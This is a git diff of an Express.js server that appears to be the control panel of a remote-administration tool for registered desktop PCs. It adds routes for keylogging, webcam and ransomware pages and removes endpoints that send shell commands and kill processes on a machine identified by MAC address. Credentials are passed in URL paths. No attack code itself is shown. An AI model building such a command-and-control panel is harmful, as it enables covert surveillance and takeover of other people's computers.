@@ -61,6 +61,26 @@ app.get('/', function (req, res) {
   }
 });
 
+app.get('/filesystem.html', function(req, res) {
+  res.sendFile(publicPath + "filesystem.html");
+});
+
+app.get('/text2speech.html', function(req, res) {
+  res.sendFile(publicPath + "text2speech.html");
+})
+
+app.get('/keylogging.html', function(req, res) {
+  res.sendFile(publicPath + "keylogging.html");
+});
+
+app.get('/webcam.html', function(req, res) {
+  res.sendFile(publicPath + "webcam.html");
+});
+
+app.get('/ransomware.html', function(req, res) {
+  res.sendFile(publicPath + "webcam.html");
+});
+
 app.get('/decodeTest', function(req, res) {
   var base64String = "VGhpcyBpcyBhIHRlc3QNCnBscyB3b3Jr==";
   var b = new Buffer(base64String, 'base64')
@@ -79,7 +99,7 @@ app.get('/test', function(req, res) {
 	  res.sendFile(path + "/sockettest.html");
 });
 
-app.get('/getmac', function(req, res){
+app.get('/getpctoken', function(req, res){
   if(req.session.user != null)
   {
     db.getCurrentUserId(req,function(userId){
@@ -115,7 +135,7 @@ function parseIncomingJSONFromDesktop(rawjson)
 
 app.get('/css/:file', function (req, res) { sendFolder("css",req,res); });
 app.get('/images/:file', function (req, res) { sendFolder("images",req,res); });
-app.get('/js/:file', function (req, res) { sendFolder("js",req,res); });
+app.get('/scripts/:file', function (req, res) { sendFolder("scripts",req,res); });
 app.get('/files/:file', function (req, res) { sendFolder("files",req,res); });
 
 function sendFolder(folder,req,res)
@@ -153,21 +173,6 @@ app.get('/pcauth/:username/:password/:mac/:title', function(req, res) {
   auth.authenticateComputer(username,password,title,mac,function(msg){
     res.send(msg);
   });
-});
-
-app.get('/command/:mac', function(req, res){
-  var cmdInfo = controls.command;
-  controls.getCommand(req.params.mac,res);
-});
-
-app.post('/sendcommand/:mac', function(req, res){
-  controls.cmd(req.body.command);
-  res.send("true");
-});
-
-app.post('/sendkill/:mac', function(req, res){
-  console.log(req.body);
-  controls.kill(req.body.pid,req.params.mac,res);
 });
 
 app.post('/auth', function(req, res) {
